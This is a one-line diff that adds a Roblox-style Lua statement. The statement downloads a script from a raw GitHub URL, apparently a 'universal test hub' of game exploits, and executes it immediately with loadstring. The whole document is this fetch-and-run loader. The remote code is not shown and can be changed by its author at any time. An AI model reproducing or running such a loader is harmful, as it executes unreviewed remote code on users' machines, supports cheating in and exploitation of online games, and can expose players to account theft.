@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarTGTtfd/universal-script-test-hub/main/universal%20test%20hub%20op"))()
